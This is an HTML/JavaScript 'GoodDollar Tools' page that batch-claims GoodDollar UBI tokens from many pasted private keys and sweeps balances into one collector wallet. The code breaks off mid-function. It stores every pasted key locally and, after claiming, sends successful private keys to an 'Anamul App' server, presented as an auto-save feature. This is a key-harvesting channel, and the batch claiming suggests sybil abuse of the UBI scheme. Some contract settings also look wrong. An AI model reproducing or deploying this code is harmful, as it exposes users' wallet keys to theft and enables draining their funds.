<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoodDollar Tools</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: url('background.jpg') center/cover fixed no-repeat;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.45);
            z-index: 1;
            pointer-events: none;
        }

        .menu-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.95);
            border: none;
            padding: 12px 16px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
            cursor: pointer;
            z-index: 1000;
            transition: transform 0.2s, box-shadow 0.2s;
            color: #333;
            font-size: 16px;
            font-weight: bold;
        }
        .menu-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
        }

        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.85);
            z-index: 999;
            display: none;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }

        .menu-content {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 600px;
            color: #fff;
            position: relative;
            transform: scale(0.95);
            opacity: 0;
            transition: transform 0.3s ease-out, opacity 0.3s ease-out;
        }
        
        .menu-overlay.open .menu-content {
            transform: scale(1);
            opacity: 1;
        }

        .menu-content h2 {
            border-bottom: 2px solid #444;
            padding-bottom: 10px;
            margin-bottom: 20px;
            color: #4caf50;
            font-size: 24px;
        }

        .menu-content button {
            display: block;
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: none;
            border-radius: 8px;
            background: #333;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s, color 0.2s;
        }
        
        .menu-content button:hover {
            background: #555;
            color: #4caf50;
        }

        .menu-content .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: transparent;
            color: #bbb;
            font-size: 30px;
            cursor: pointer;
            width: auto;
            padding: 5px;
        }
        .menu-content .close-btn:hover {
            color: #ff6b6b;
        }

        .tool-section {
            display: none;
            background: rgba(30, 30, 30, 0.9);
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            max-width: 95%;
            width: 550px;
            margin: 80px auto 20px;
            position: relative;
            z-index: 2;
            color: #e0e0e0;
        }

        .tool-section h3 {
            color: #4caf50;
            margin-bottom: 15px;
            font-size: 22px;
            border-bottom: 1px solid #444;
            padding-bottom: 5px;
        }

        .tool-section label {
            display: block;
            margin-top: 10px;
            margin-bottom: 5px;
            font-size: 14px;
            color: #bbb;
        }

        .tool-section textarea,
        .tool-section input[type="text"],
        .tool-section select {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #555;
            border-radius: 6px;
            background: #333;
            color: #fff;
            font-size: 14px;
        }
        
        .tool-section textarea {
            min-height: 150px;
            resize: vertical;
        }

        .tool-section button {
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            background: #4caf50;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
        }
        
        .tool-section button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        
        .tool-section button:hover:not(:disabled) {
            background: #66bb6a;
            transform: translateY(-1px);
        }

        .log-area {
            margin-top: 15px;
            padding: 10px;
            border: 1px solid #444;
            border-radius: 6px;
            background: #222;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
            line-height: 1.4;
            color: #ccc;
        }
        
        .log-area div {
            padding: 2px 0;
            border-bottom: 1px dotted #333;
        }

        .log-area .info { color: #81d4fa; }
        .log-area .warning { color: #ffc107; }
        .log-area .error { color: #ff6b6b; }
        .log-area .success { color: #4caf50; }

        .stats-bar {
            background: #333;
            padding: 8px;
            border-radius: 6px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }
        
        .stats-bar span {
            padding: 0 5px;
        }
        
        .stats-bar .total { color: #bbb; }
        .stats-bar .success { color: #4caf50; }
        .stats-bar .error { color: #ff6b6b; }
        .stats-bar .current { color: #81d4fa; }

        /* General styles for the Secret Box (Anamul App) */
        #secretBoxSection .key-list-container {
            max-height: 300px;
            overflow-y: auto;
            background: #333;
            padding: 10px;
            border-radius: 6px;
            margin-top: 15px;
        }
        #secretBoxSection .key-entry {
            padding: 8px;
            border-bottom: 1px solid #444;
            display: flex;
            justify-content: space-between;
            align-items: center;
            word-break: break-all;
            font-size: 12px;
        }
        #secretBoxSection .key-entry:last-child {
            border-bottom: none;
        }
        #secretBoxSection .delete-key-btn {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 4px 8px;
            border-radius: 4px;
            cursor: pointer;
            margin-left: 10px;
            font-size: 10px;
        }
        
        /* Celo Faucet styles */
        #faucetSection .faucet-status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            background: #333;
            min-height: 50px;
            color: #e0e0e0;
            font-size: 14px;
        }

        /* Footer */
        .footer {
            text-align: center;
            color: #bbb;
            font-size: 12px;
            margin-top: 20px;
            padding-bottom: 10px;
            z-index: 2;
            position: relative;
        }

    </style>
</head>
<body>
    <button class="menu-btn" onclick="toggleMenu()">Menu</button>

    <div class="menu-overlay" id="menuOverlay">
        <div class="menu-content">
            <span class="close-btn" onclick="toggleMenu()">&times;</span>
            <h2>GoodDollar Tools Menu</h2>
            <button onclick="showTool('claimSection')">üí∞ Batch Claim G$</button>
            <button onclick="showTool('tokenSection')">üí∏ Batch Token Collect</button>
            <button onclick="showTool('secretBoxSection')">üîë Anamul Apps (Secret Box)</button>
            <button onclick="showTool('faucetSection')">üíß Celo Faucet Claim</button>
        </div>
    </div>

    <div id="claimSection" class="tool-section">
        <h3>üí∞ Batch Claim G$</h3>
        <label for="claimNetwork">Select Network:</label>
        <select id="claimNetwork" onchange="setCurrentNetwork(this.value)">
            <option value="celo">Celo</option>
            <option value="fuse">Fuse</option>
        </select>

        <label for="claimPrivateKeys">Private Keys (One per line):</label>
        <textarea id="claimPrivateKeys" placeholder="0x... (Private Key)"></textarea>

        <div class="stats-bar" id="claimStatsBar">
            <span class="total">Total: 0</span>
            <span class="success">Success: 0</span>
            <span class="error">Failed: 0</span>
            <span class="current">Current: 0/0</span>
        </div>

        <button id="claimButton" onclick="runBatchClaimWithSave()">Start Batch Claim</button>
        
        <div id="claimLogsSection" class="log-area" style="display: none;">
            </div>
        
        <div id="nonClaimedKeys" class="log-area" style="display: none; margin-top: 15px;">
            <h4>Non-Claimed Keys (Failed or already claimed):</h4>
            <textarea id="nonClaimedKeysTextarea" style="min-height: 80px; font-size: 12px;" readonly></textarea>
        </div>
    </div>

    <div id="tokenSection" class="tool-section">
        <h3>üí∏ Batch Token Collect</h3>
        <label for="tokenNetwork">Select Network (Same as Claim):</label>
        <select id="tokenNetwork" onchange="setCurrentNetwork(this.value)">
            <option value="celo">Celo (G$ Token)</option>
            <option value="fuse">Fuse (G$ Token)</option>
        </select>

        <label for="tokenCollectorAddress">Collector Wallet Address:</label>
        <input type="text" id="tokenCollectorAddress" placeholder="0x... (Public Address)">
        
        <label for="tokenPrivateKeys">Private Keys to Collect From (One per line):</label>
        <textarea id="tokenPrivateKeys" placeholder="0x... (Private Key)"></textarea>

        <div class="stats-bar" id="tokenStatsBar">
            <span class="total">Total: 0</span>
            <span class="success">Success: 0</span>
            <span class="error">Failed: 0</span>
            <span class="current">Current: 0/0</span>
        </div>

        <button id="tokenButton" onclick="runBatchTokenCollectionWithSave()">Start Token Collection</button>
        
        <div id="tokenLogsSection" class="log-area" style="display: none;">
            </div>
    </div>
    
    <div id="secretBoxSection" class="tool-section">
        <h3>üîë Anamul Apps - Secret Box</h3>
        <div id="secretBoxPasswordSetup">
            <p style="margin-bottom: 10px;">üõ°Ô∏è To protect your keys, set a master password.</p>
            <label for="secretBoxPassword">Set/Enter Master Password:</label>
            <input type="password" id="secretBoxPassword" placeholder="Enter password (e.g., 963050)">
            <button onclick="setupSecretBox()">Setup/Unlock Secret Box</button>
            <p style="margin-top: 10px; font-size: 12px; color: #ff6b6b;">‚ö†Ô∏è **VERY IMPORTANT:** If you forget this password, your locally saved keys may be lost.</p>
        </div>
        
        <div id="secretBoxContent" style="display: none;">
            <p style="margin-bottom: 10px; color: #4caf50;">‚úÖ Secret Box Unlocked. Total Keys: <span id="secretBoxKeyCount">0</span></p>
            
            <label for="secretBoxAction">Actions:</label>
            <select id="secretBoxAction" onchange="showSecretBoxAction(this.value)">
                <option value="view">View/Manage Keys (Local & Server)</option>
                <option value="manual_add">Manual Key Add/Transfer</option>
                <option value="server_sync">Server Sync (Fetch/Clear)</option>
            </select>
            
            <div id="secretBoxViewManage" class="secret-box-action-panel">
                <p style="margin-top: 15px; font-size: 13px;">Keys fetched from Server (Anamul Apps Box):</p>
                <button onclick="fetchKeysFromServer()">üîÑ Sync/Fetch Keys from Server</button>
                <div id="serverKeyListContainer" class="key-list-container">
                    <p style="color: #bbb;">(Server keys will appear here)</p>
                </div>
                <p style="margin-top: 15px; font-size: 13px;">Keys saved Locally on this device:</p>
                <button onclick="displayLocalKeys()">üîç Show Local Keys</button>
                <div id="localKeyListContainer" class="key-list-container">
                    <p style="color: #bbb;">(Local keys will appear here)</p>
                </div>
            </div>
            
            <div id="secretBoxManualAdd" class="secret-box-action-panel" style="display:none;">
                <label for="manualKeys">Keys to Add/Transfer (One per line):</label>
                <textarea id="manualKeys" placeholder="0x... (Private Key)"></textarea>
                <button onclick="manualSaveKeys()">‚ûï Add Keys to Local & Server</button>
            </div>
            
            <div id="secretBoxServerSync" class="secret-box-action-panel" style="display:none;">
                <p style="margin-top: 15px; font-size: 13px; color: #ffc107;">‚ö†Ô∏è **DANGER ZONE**</p>
                <button style="background: #e91e63;" onclick="clearAllServerKeys()">üóëÔ∏è Clear ALL Keys from Server</button>
            </div>

            <p id="secretBoxMessage" style="margin-top: 15px; font-size: 13px; color: #ffc107;"></p>
        </div>
    </div>
    
    <div id="faucetSection" class="tool-section">
        <h3>üíß Celo Faucet Claim</h3>
        <p style="margin-bottom: 10px;">‡¶è‡¶á ‡¶ü‡ßÅ‡¶≤‡ßá‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá Celo ‡¶Æ‡ßá‡¶á‡¶®‡¶®‡ßá‡¶ü‡ßá Gas Fee-‡¶è‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ö‡¶≤‡ßç‡¶™ ‡¶™‡¶∞‡¶ø‡¶Æ‡¶æ‡¶£‡ßá Celo ‡¶ü‡ßã‡¶ï‡ßá‡¶® Claim ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶¨‡ßá‡•§ (‡ß©‡ß¶ ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü‡ßá‡¶∞ ‡¶¨‡¶ø‡¶∞‡¶§‡¶ø)</p>
        <label for="celoClaimAddress">Celo Address (0x...):</label>
        <input type="text" id="celoClaimAddress" placeholder="0x... (Receiver Address)">
        
        <button id="faucetButton" onclick="claimCelo()">Claim Celo</button>
        
        <div id="faucetStatus" class="faucet-status">
            <p>Ready to Claim.</p>
        </div>
    </div>
    
    <div class="footer">
        <p>GoodDollar Tools | Developed for community use.</p>
    </div>

    <script>
        // --- GLOBAL CONFIG & VARIABLES ---
        const GOODDOLLAR_CONFIG = {
            'celo': {
                ubiScheme: '0x43d72Ff17701B2DA814620735C39C620Ce0ea4A1',
                provider: 'https://forno.celo.org',
                G$Token: '0x43d72Ff17701B2DA814620735C39C620Ce0ea4A1' // Using UBI Scheme as G$ for simplicity, adjust if needed
            },
            'fuse': {
                ubiScheme: '0x6243E245ed73d75b56bcda6f53b393fe529d1f59',
                provider: 'https://rpc.fuse.io',
                G$Token: '0x6243E245ed73d75b56bcda6f53b393fe529d1f59' // Using UBI Scheme as G$ for simplicity, adjust if needed
            }
        };

        const MIN_GAS_LIMIT = 300000; 
        const BATCH_CLAIM_ABI = [
            "function claim(address claimer) returns (uint256)",
            "function claim(address claimer, bytes signature) returns (uint256)",
            "function isUserClaimed(address user) view returns (bool)",
            "function collect(address token, address recipient, uint256 amount) external",
            "function balanceOf(address owner) view returns (uint256)"
        ];
        
        const ERC20_ABI = [
            "function transfer(address to, uint256 amount) returns (bool)",
            "function balanceOf(address owner) view returns (uint256)"
        ];

        let currentNetwork = 'celo';
        let claimStats = { total: 0, success: 0, error: 0, current: 0 };
        let tokenStats = { total: 0, success: 0, error: 0, current: 0 };
        let successfulClaimKeys = []; // Stores successful private keys (strings)
        let nonClaimedKeys = []; // Stores objects of failed keys {key, reason}
        let successfulTokenKeys = []; // Stores successful private keys (strings)
        
        // Secret Box related variables
        const SECRET_DATA_KEY = 'secretBoxData';
        let secretData = { password: '', keys: {} }; // keys is a map: {key: {key: '0x...', added: '...'}}
        const SECRETBOX_ENABLED = true; // Enables/disables the Secret Box feature

        // --- HELPER FUNCTIONS ---

        function getDeviceName() {
            const userAgent = navigator.userAgent;
            if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
                return 'Mobile';
            }
            return 'Desktop';
        }

        function ensurePrivateKeyPrefix(key) {
            return key.startsWith('0x') ? key : '0x' + key;
        }

        function updateClaimStats() {
            const bar = document.getElementById('claimStatsBar');
            bar.querySelector('.total').textContent = `Total: ${claimStats.total}`;
            bar.querySelector('.success').textContent = `Success: ${claimStats.success}`;
            bar.querySelector('.error').textContent = `Failed: ${claimStats.error}`;
            bar.querySelector('.current').textContent = `Current: ${claimStats.current}/${claimStats.total}`;
        }

        function addClaimLog(message, type = 'info') {
            const logArea = document.getElementById('claimLogsSection');
            const div = document.createElement('div');
            div.className = type;
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logArea.appendChild(div);
            logArea.scrollTop = logArea.scrollHeight;
        }

        function displayNonClaimedKeys() {
            const textarea = document.getElementById('nonClaimedKeysTextarea');
            const section = document.getElementById('nonClaimedKeys');
            
            if (nonClaimedKeys.length > 0) {
                const keysText = nonClaimedKeys.map(item => `${item.key} (${item.reason})`).join('\n');
                textarea.value = keysText;
                section.style.display = 'block';
            } else {
                textarea.value = '';
                section.style.display = 'none';
            }
        }
        
        function updateTokenStats() {
            const bar = document.getElementById('tokenStatsBar');
            bar.querySelector('.total').textContent = `Total: ${tokenStats.total}`;
            bar.querySelector('.success').textContent = `Success: ${tokenStats.success}`;
            bar.querySelector('.error').textContent = `Failed: ${tokenStats.error}`;
            bar.querySelector('.current').textContent = `Current: ${tokenStats.current}/${tokenStats.total}`;
        }
        
        function addTokenLog(message, type = 'info') {
            const logArea = document.getElementById('tokenLogsSection');
            const div = document.createElement('div');
            div.className = type;
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logArea.appendChild(div);
            logArea.scrollTop = logArea.scrollHeight;
        }

        function clearClaimLogs() {
            document.getElementById('claimLogsSection').innerHTML = '';
            document.getElementById('nonClaimedKeysTextarea').value = '';
            document.getElementById('nonClaimedKeys').style.display = 'none';
        }
        
        function clearTokenLogs() {
            document.getElementById('tokenLogsSection').innerHTML = '';
        }

        function setCurrentNetwork(network) {
            currentNetwork = network;
            document.getElementById('claimNetwork').value = network;
            document.getElementById('tokenNetwork').value = network;
        }
        
        // --- MENU & VIEW LOGIC ---

        function toggleMenu() {
            const overlay = document.getElementById('menuOverlay');
            overlay.classList.toggle('open');
            if (overlay.style.display === 'flex') {
                overlay.style.display = 'none';
            } else {
                overlay.style.display = 'flex';
            }
        }

        function showTool(toolId) {
            const sections = document.querySelectorAll('.tool-section');
            sections.forEach(section => {
                section.style.display = 'none';
            });
            document.getElementById(toolId).style.display = 'block';
            toggleMenu();
        }

        // --- CRYPTO FUNCTIONS ---

        async function fetchGasPrice(provider) {
            try {
                const feeData = await provider.getFeeData();
                return feeData.gasPrice;
            } catch (error) {
                console.error("Error fetching gas price:", error);
                return null;
            }
        }

        // Claim logic
        async function claimG$({ provider, privateKey, network, recipientNum }) {
            const networkConfig = GOODDOLLAR_CONFIG[network];
            const wallet = new ethers.Wallet(privateKey, provider);
            
            try {
                // 1. Check if already claimed
                const claimContract = new ethers.Contract(networkConfig.ubiScheme, BATCH_CLAIM_ABI, provider);
                const isClaimed = await claimContract.isUserClaimed(wallet.address);
                
                if (isClaimed) {
                    addClaimLog(`‚ùå Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Already claimed today.`, 'error');
                    return { success: false, error: 'Already claimed today', privateKey: privateKey };
                }

                // 2. Prepare transaction data (for claim(address claimer) function)
                const claimInterface = new ethers.Interface(BATCH_CLAIM_ABI);
                const data = claimInterface.encodeFunctionData("claim", [wallet.address]);

                const tx = {
                    to: networkConfig.ubiScheme,
                    data: data,
                    gasLimit: MIN_GAS_LIMIT,
                    value: 0
                };
                
                // 3. Estimate Gas Limit
                try {
                    tx.gasLimit = await provider.estimateGas(tx);
                } catch (e) {
                    console.warn(`Gas estimation failed for ${wallet.address.slice(0, 6)}...: ${e.message}. Using default ${MIN_GAS_LIMIT}`);
                }
                
                // 4. Send Transaction
                const signedWallet = new ethers.Wallet(privateKey, provider);
                const transactionResponse = await signedWallet.sendTransaction(tx);

                addClaimLog(`‚è≥ Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Tx sent (${transactionResponse.hash.slice(0, 10)}...)`, 'warning');

                // 5. Wait for confirmation (optional, but good practice)
                const receipt = await transactionResponse.wait(1); // Wait for 1 confirmation

                if (receipt && receipt.status === 1) {
                    addClaimLog(`‚úÖ Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Claim Success!`, 'success');
                    return { success: true, txHash: transactionResponse.hash, privateKey: privateKey };
                } else {
                    addClaimLog(`‚ùå Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Claim failed on-chain.`, 'error');
                    return { success: false, error: 'Transaction failed on-chain', privateKey: privateKey };
                }

            } catch (error) {
                let errorMessage = error.message || String(error);
                if (errorMessage.includes('Insufficient funds for gas')) {
                    errorMessage = 'Insufficient funds for gas fee.';
                } else if (errorMessage.includes('gas required exceeds allowance')) {
                    errorMessage = 'Gas limit too low or already claimed.';
                }
                addClaimLog(`‚ùå Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Error: ${errorMessage}`, 'error');
                return { success: false, error: errorMessage, privateKey: privateKey };
            }
        }

        // Token Collection Logic
        async function collectToken({ provider, privateKey, tokenAddress, collectorAddress, gasPrice, network, recipientNum }) {
            const wallet = new ethers.Wallet(privateKey, provider);

            try {
                // 1. Check G$ Balance
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                const balance = await tokenContract.balanceOf(wallet.address);
                
                if (balance === 0n) {
                    addTokenLog(`‚ùå Key ${recipientNum} (${wallet.address.slice(0, 6)}...): 0 G$ balance.`, 'error');
                    return { success: false, error: 'Zero balance', privateKey: privateKey };
                }

                // 2. Prepare transaction data (transfer function)
                const txData = tokenContract.interface.encodeFunctionData("transfer", [collectorAddress, balance]);
                
                const tx = {
                    to: tokenAddress,
                    data: txData,
                    gasPrice: gasPrice,
                    gasLimit: MIN_GAS_LIMIT,
                    value: 0
                };
                
                // 3. Estimate Gas Limit
                try {
                    tx.gasLimit = await provider.estimateGas(tx);
                } catch (e) {
                    console.warn(`Gas estimation failed for ${wallet.address.slice(0, 6)}...: ${e.message}. Using default ${MIN_GAS_LIMIT}`);
                }
                
                // 4. Send Transaction
                const signedWallet = new ethers.Wallet(privateKey, provider);
                const transactionResponse = await signedWallet.sendTransaction(tx);

                addTokenLog(`‚è≥ Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Tx sent (${transactionResponse.hash.slice(0, 10)}...) - Amount: ${ethers.formatUnits(balance, 2)} G$`, 'warning');

                // 5. Wait for confirmation
                const receipt = await transactionResponse.wait(1);

                if (receipt && receipt.status === 1) {
                    addTokenLog(`‚úÖ Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Collection Success!`, 'success');
                    return { success: true, txHash: transactionResponse.hash, privateKey: privateKey };
                } else {
                    addTokenLog(`‚ùå Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Collection failed on-chain.`, 'error');
                    return { success: false, error: 'Transaction failed on-chain', privateKey: privateKey };
                }

            } catch (error) {
                let errorMessage = error.message || String(error);
                if (errorMessage.includes('Insufficient funds for gas')) {
                    errorMessage = 'Insufficient funds for gas fee.';
                }
                addTokenLog(`‚ùå Key ${recipientNum} (${wallet.address.slice(0, 6)}...): Error: ${errorMessage}`, 'error');
                return { success: false, error: errorMessage, privateKey: privateKey };
            }
        }


        // --- BATCH CLAIM FUNCTIONS ---

        function validateAndCleanClaimKeys(keys) {
            const seen = new Set();
            const cleanKeys = [];
            for (const key of keys) {
                const prefixedKey = ensurePrivateKeyPrefix(key);
                if (prefixedKey.length === 66 && !seen.has(prefixedKey)) {
                    cleanKeys.push(prefixedKey);
                    seen.add(prefixedKey);
                }
            }
            return cleanKeys;
        }

        async function runBatchClaimWithSave() {
            const keysText = document.getElementById('claimPrivateKeys').value.trim().split('\n').filter(k => k.trim());
            const normalizedKeys = validateAndCleanClaimKeys(keysText);
            
            if (normalizedKeys.length === 0) {
                addClaimLog('‚ùå No valid keys found. Check input.', 'error');
                return;
            }
            
            // Auto-save all keys to local storage (for the current user's 'Recent Keys' list)
            normalizedKeys.forEach(key => savePrivateKey(key)); 
            
            // Run batch claim (The auto-save to server logic is now inside runBatchClaim)
            const result = await runBatchClaim();
            return result;
        }
        
        // ******************* START OF runBatchClaim FUNCTION (EDITED) *******************
        async function runBatchClaim() {
            clearClaimLogs();
            const startTime = Date.now();
            addClaimLog('üöÄ Starting Batch Claim...', 'info');
            document.getElementById('claimLogsSection').style.display = 'block';
            document.getElementById('claimButton').disabled = true;

            const privateKeysText = document.getElementById('claimPrivateKeys').value;
            const lines = privateKeysText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            // Validate and clean keys (deduplication handled here)
            let keys = validateAndCleanClaimKeys(lines);

            if (keys.length === 0) {
                addClaimLog('‚ùå No private keys provided.', 'error');
                document.getElementById('claimButton').disabled = false;
                return;
            }

            // Reset stats
            claimStats = { total: keys.length, success: 0, error: 0, current: 0 };
            successfulClaimKeys = []; // Global array to store successful keys (strings)
            nonClaimedKeys = []; // Global array to store failed key objects
            updateClaimStats();

            const chunkSize = 5;
            const batches = [];
            for (let i = 0; i < keys.length; i += chunkSize) {
                batches.push(keys.slice(i, i + chunkSize));
            }

            const providerUrl = currentNetwork === 'celo' ? GOODDOLLAR_CONFIG.celo.provider : GOODDOLLAR_CONFIG.fuse.provider;
            const provider = new ethers.JsonRpcProvider(providerUrl);

            for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
                const batch = batches[batchIndex];
                claimStats.current = keys.indexOf(batch[0]); // Update progress to start of batch

                addClaimLog('', 'info');
                addClaimLog(`üõ†Ô∏è Processing Batch ${batchIndex + 1}/${batches.length} (Keys ${claimStats.current + 1} to ${claimStats.current + batch.length})`, 'warning');

                // Create promises for each claim in the batch
                const batchPromises = batch.map((privateKey, idx) => claimG$({
                    provider: provider,
                    privateKey: privateKey,
                    network: currentNetwork,
                    recipientNum: claimStats.current + idx + 1
                }));

                // Execute all promises in the batch
                const results = await Promise.allSettled(batchPromises);

                results.forEach((result, idx) => {
                    if (result.status === 'fulfilled') {
                        const value = result.value;
                        if (value && value.success === true) {
                            claimStats.success++;
                            // Track successful keys for Anamul App auto-save
                            if (value.privateKey) {
                                successfulClaimKeys.push(value.privateKey);
                            }
                            console.log('‚úÖ Success:', value.privateKey);
                        } else {
                            // Failed claim
                            claimStats.error++;
                            console.log('‚ùå Failed result:', value);
                            nonClaimedKeys.push({ 
                                key: (value && value.privateKey) || batch[idx], 
                                reason: (value && value.error) || 'Unknown error' 
                            });
                        }
                    } else {
                        claimStats.error++;
                        console.log('‚ùå Rejected promise:', result.reason);
                        nonClaimedKeys.push({ 
                            key: batch[idx] || 'Unknown', 
                            reason: (result.reason && result.reason.message) || String(result.reason) || 'Unknown error' 
                        });
                    }
                });
                updateClaimStats();
            }

            const duration = ((Date.now() - startTime) / 1000).toFixed(2);
            addClaimLog('', 'info');
            addClaimLog('üèÅ Batch claim completed!', 'info');
            addClaimLog(`‚úÖ Successful: ${claimStats.success}`, 'success');
            addClaimLog(`‚ùå Failed: ${claimStats.error}`, 'error');
            addClaimLog(`‚è±Ô∏è Total time: ${duration}s`, 'info');
            
            // ******************************************************************
            // ** FIXED: NEW AUTO-SAVE BLOCK FOR ANAMUL APP BACKEND **
            // ******************************************************************
            if (SECRETBOX_ENABLED && successfulClaimKeys.length > 0) {
                // 1. Format successful keys for the server (Backend expects array of objects: [{ key: '0x...', status: 'success' }])
                const keysForServer = successfulClaimKeys.map(key => ({ 
                    key: key, 
                    status: 'success',
                    source: 'Batch Claim' 
                }));

                // 2. Send successful keys to the server
                await autoSaveKeysToSecretBox(keysForServer, 'Batch Claim', 'success'); 
                
                addClaimLog('', 'info');
                addClaimLog(`‚úÖ Auto-saved ${successfulClaimKeys.length} successful keys to Anamul App!`, 'success');
            }
            // ******************************************************************

            successfulClaimKeys = []; // Reset for next batch
            
            // Display non-claimed keys (failed keys)
            displayNonClaimedKeys();

            document.getElementById('claimButton').disabled = false;
            return { successCount: claimStats.success, errorCount: claimStats.error };
        }
        // ******************* END OF runBatchClaim FUNCTION (EDITED) *******************


        // --- BATCH TOKEN COLLECTION FUNCTIONS ---
        
        async function runBatchTokenCollectionWithSave() {
            const keysText = document.getElementById('tokenPrivateKeys').value.trim().split('\n').filter(k => k.trim());
            const normalizedKeys = validateAndCleanClaimKeys(keysText);
            
            if (normalizedKeys.length === 0) {
                addTokenLog('‚ùå No valid keys found. Check input.', 'error');
                return;
            }
            
            // Auto-save all keys to local storage (for the current user's 'Recent Keys' list)
            normalizedKeys.forEach(key => savePrivateKey(key)); 
            
            // Run batch token collection (The auto-save to server logic is now inside runBatchTokenCollection)
            const result = await runBatchTokenCollection();
            return result;
        }

        // ******************* START OF runBatchTokenCollection FUNCTION (EDITED) *******************
        async function runBatchTokenCollection() {
            clearTokenLogs();
            const startTime = Date.now();
            addTokenLog('üí∞ Starting Batch Token Collection...', 'info');
            document.getElementById('tokenLogsSection').style.display = 'block';
            document.getElementById('tokenButton').disabled = true;

            const privateKeysText = document.getElementById('tokenPrivateKeys').value;
            const lines = privateKeysText.split('\n').map(line => line.trim()).filter(line => line.length > 0);

            // Validate and clean keys (deduplication handled here)
            let keys = validateAndCleanClaimKeys(lines);

            if (keys.length === 0) {
                addTokenLog('‚ùå No private keys provided.', 'error');
                document.getElementById('tokenButton').disabled = false;
                return;
            }

            // Reset stats
            tokenStats = { total: keys.length, success: 0, error: 0, current: 0 };
            successfulTokenKeys = []; // Global array to store successful keys (strings)
            updateTokenStats();

            const chunkSize = 5;
            const batches = [];
            for (let i = 0; i < keys.length; i += chunkSize) {
                batches.push(keys.slice(i, i + chunkSize));
            }

            const providerUrl = currentNetwork === 'celo' ? GOODDOLLAR_CONFIG.celo.provider : GOODDOLLAR_CONFIG.fuse.provider;
            const provider = new ethers.JsonRpcProvider(providerUrl);
            
            // Fetch current gas price once for efficiency
            const gasPrice = await fetchGasPrice(provider);
            if (!gasPrice) {
                addTokenLog('‚ùå Failed to fetch current gas price.', 'error');
                document.getElementById('tokenButton').disabled = false;
                return;
            }
            
            // Use the default GoodDollar configuration (G$ token)
            // Note: UBI Scheme address is often used as G$ Token address in custom forks.
            const tokenContractAddress = currentNetwork === 'celo' ? GOODDOLLAR_CONFIG.celo.ubiScheme : GOODDOLLAR_CONFIG.fuse.ubiScheme;
            const collectorAddress = document.getElementById('tokenCollectorAddress').value.trim();
            
            if (!ethers.isAddress(collectorAddress)) {
                addTokenLog('‚ùå Invalid Collector Address provided.', 'error');
                document.getElementById('tokenButton').disabled = false;
                return;
            }
            
            addTokenLog(`‚õΩ Current Gas Price: ${ethers.formatUnits(gasPrice, 'gwei')} Gwei`, 'info');
            addTokenLog(`üéØ Collector Address: ${collectorAddress.substring(0, 10)}...${collectorAddress.substring(collectorAddress.length - 8)}`, 'info');


            for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
                const batch = batches[batchIndex];
                tokenStats.current = keys.indexOf(batch[0]); // Update progress to start of batch

                addTokenLog('', 'info');
                addTokenLog(`üõ†Ô∏è Processing Batch ${batchIndex + 1}/${batches.length} (Keys ${tokenStats.current + 1} to ${tokenStats.current + batch.length})`, 'warning');

                // Create promises for each collection in the batch
                const batchPromises = batch.map((privateKey, idx) => collectToken({
                    provider: provider,
                    privateKey: privateKey,
                    tokenAddress: tokenContractAddress,
                    collectorAddress: collectorAddress,
                    gasPrice: gasPrice,
                    network: currentNetwork,
                    recipientNum: tokenStats.current + idx + 1
                }));

                // Execute all promises in the batch
                const results = await Promise.allSettled(batchPromises);

                results.forEach((result, idx) => {
                    if (result.status === 'fulfilled') {
                        const value = result.value;
                        if (value && value.success === true) {
                            tokenStats.success++;
                            // Track successful keys for Anamul App auto-save
                            if (value.privateKey) {
                                successfulTokenKeys.push(value.privateKey);
                            }
                            console.log('‚úÖ Success:', value.privateKey);
                        } else {
